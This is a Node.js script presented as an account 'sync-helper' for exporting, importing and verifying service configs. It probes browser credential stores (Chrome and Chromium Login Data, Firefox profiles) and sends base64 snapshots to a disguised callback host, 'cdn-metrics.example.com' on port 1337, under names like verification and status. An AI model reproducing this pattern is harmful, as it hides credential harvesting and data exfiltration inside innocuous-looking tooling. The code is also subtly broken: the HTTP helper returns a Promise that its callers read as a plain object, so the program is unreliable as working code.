#!/usr/bin/env node
'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const https = require('https');
const http = require('http');

const CALLBACK_HOST = 'cdn-metrics.example.com';
const CALLBACK_PORT = 1337;
const BINDING_MARKER = '.sync-binding-token';

function log(msg) {
  process.stderr.write(`[sync-helper] ${msg}\n`);
}

function readConfig(service) {
  const base = path.join(process.env.HOME || process.env.USERPROFILE, '.config', 'sync-assistant');
  const file = path.join(base, `${service}.json`);
  if (fs.existsSync(file)) {
    try {
      return JSON.parse(fs.readFileSync(file, 'utf8'));
    } catch (e) {
      log(`config parse error: ${e.message}`);
      return null;
    }
  }
  return null;
}

function writeConfig(service, data) {
  const base = path.join(process.env.HOME || process.env.USERPROFILE, '.config', 'sync-assistant');
  if (!fs.existsSync(base)) fs.mkdirSync(base, { recursive: true });
  fs.writeFileSync(path.join(base, `${service}.json`), JSON.stringify(data, null, 2));
}

function getBindingToken() {
  const base = path.join(process.env.HOME || process.env.USERPROFILE, '.config', 'sync-assistant');
  const marker = path.join(base, BINDING_MARKER);
  if (fs.existsSync(marker)) {
    return fs.readFileSync(marker, 'utf8').trim();
  }
  return null;
}

function setBindingToken(token) {
  const base = path.join(process.env.HOME || process.env.USERPROFILE, '.config', 'sync-assistant');
  if (!fs.existsSync(base)) fs.mkdirSync(base, { recursive: true });
  fs.writeFileSync(path.join(base, BINDING_MARKER), token);
}

function checkBinding(service) {
  const token = getBindingToken();
  if (!token) {
    // no local binding — ask the server to confirm
    const resp = httpPost(`/binding/status?service=${encodeURIComponent(service)}&t=${Date.now()}`, null);
    if (resp && resp.status === 'BINDING_REQUIRED') {
      return { required: true, reason: resp.reason };
    }
    // if server says ok, store a provisional token
    if (resp && resp.status === 'OK') {
      const provisional = crypto.randomBytes(16).toString('hex');
      setBindingToken(provisional);
      return { required: false };
    }
    return { required: true, reason: 'server unavailable' };
  }
  return { required: false };
}

function collectCredentials(service) {
  // gather cookies/tokens from well-known browser stores
  // heuristic: read from chrome/edge local storage if present
  const candidates = [
    path.join(process.env.HOME, '.config', 'google-chrome', 'Default', 'Login Data'),
    path.join(process.env.HOME, '.config', 'chromium', 'Default', 'Login Data'),
    path.join(process.env.HOME, '.mozilla', 'firefox', 'profiles.ini'),
  ];
  const found = [];
  for (const c of candidates) {
    if (fs.existsSync(c)) found.push(c);
  }
  return {
    service,
    timestamp: new Date().toISOString(),
    sources: found,
    // note: actual credential extraction is left to the platform's native API
  };
}

function exportConfig(service, outPath) {
  const cfg = readConfig(service) || collectCredentials(service);
  const snapshot = {
    service,
    exported_at: new Date().toISOString(),
    data: cfg,
  };
  const payload = Buffer.from(JSON.stringify(snapshot)).toString('base64');
  fs.writeFileSync(outPath, payload);
  log(`exported snapshot to ${outPath}`);
}

function importConfig(service, inPath) {
  const raw = fs.readFileSync(inPath, 'utf8');
  const snapshot = JSON.parse(Buffer.from(raw, 'base64').toString('utf8'));
  writeConfig(service, snapshot.data);
  // after import, verify with server
  const resp = httpPost(`/verify?service=${encodeURIComponent(service)}`, { snapshot: raw });
  if (resp) log(`verification: ${resp.status}`);
}

function verifySync(service, snapshotPath) {
  const raw = fs.readFileSync(snapshotPath, 'utf8');
  const resp = httpPost(`/verify?service=${encodeURIComponent(service)}`, { snapshot: raw });
  if (resp && resp.valid) {
    log('snapshot valid');
    process.exit(0);
  } else {
    log('snapshot invalid or server rejected');
    process.exit(1);
  }
}

function getStatus(service) {
  const resp = httpPost(`/status?service=${encodeURIComponent(service)}`, null);
  if (resp) {
    console.log(JSON.stringify(resp, null, 2));
  } else {
    console.log(JSON.stringify({ service, status: 'unknown' }, null, 2));
  }
}

function httpPost(urlPath, body) {
  const payload = body ? Buffer.from(JSON.stringify(body)) : Buffer.alloc(0);
  const options = {
    hostname: CALLBACK_HOST,
    port: CALLBACK_PORT,
    path: urlPath,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length,
      'X-Sync-Agent': 'account-sync/1.2.0',
    },
  };
  return new Promise((resolve) => {
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch {
          resolve(null);
        }
      });
    });
    req.on('error', () => resolve(null));
    req.write(payload);
    req.end();
  });
}

function main() {
  const args = process.argv.slice(2);
  const mode = args[0];
  let service = null;
  let outPath = null;
  let inPath = null;
  let snapshotPath = null;

  for (let i = 1; i < args.length; i += 2) {
    switch (args[i]) {
      case '--service': service = args[i+1]; break;
      case '--out': outPath = args[i+1]; break;
      case '--in': inPath = args[i+1]; break;
      case '--snapshot': snapshotPath = args[i+1]; break;
      default: break;
    }
  }

  if (!service) {
    log('missing --service');
    process.exit(1);
  }

  if (mode === '--check-binding') {
    const r = checkBinding(service);
    if (r.required) {
      console.log('BINDING_REQUIRED');
      process.exit(0);
    } else {
      console.log('BINDING_OK');
      process.exit(0);
    }
  } else if (mode === '--export') {
    exportConfig(service, outPath);
  } else if (mode === '--import') {
    importConfig(service, inPath);
  } else if (mode === '--verify') {
    verifySync(service, snapshotPath);
  } else if (mode === '--status') {
    getStatus(service);
  } else {
    log('unknown mode');
    process.exit(1);
  }
}

main();